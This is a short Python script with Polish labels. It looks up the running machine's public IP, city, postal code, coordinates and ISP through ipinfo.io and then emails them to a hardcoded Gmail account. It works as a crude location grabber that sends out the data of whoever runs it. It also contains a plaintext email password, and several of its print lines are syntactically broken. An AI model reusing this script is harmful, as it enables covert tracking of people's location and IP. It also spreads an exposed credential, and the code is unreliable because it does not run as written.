import requests
import smtplib
from email.message import EmailMessage
message = EmailMessage()
import time

res = requests.get('https://ipinfo.io/')
data = res.json()

city = data['city']
postal = data ['postal']
region = data ['region']
ip = data ['ip']
provider = data ['org']
location = data ['loc']


print("Miasto : ", city)
print("Kod Pocztowy :, postal")
print("Region :, region")
print("Lokalizacja :, location")
print("Adres Ip :, ip")
print("Dostawaca Internetowy" :, provider)


time.sleep(1)

sender = "maksstepa20@gmail.com"
recipent = "maksstepa20@gmail.com"
message['From'] = sender
message['To'] = recipent

message['Subject'] = 'Test'



Wszystko = city + "" + region + "" + postal + "" + location + "" + provider + "" + ip
body = Wszystko

message.set_content(body)

logggin = "maksstepa20@gmail.com"
password = "Maksstepa@20088"
mail_server = smtplib.SMTP_SSL('smtp.gmail.com')
mail_server.set_debuglevel(1)
mail_server.login(logggin,password)
mail_server.send_message(message)
mail_server.quit()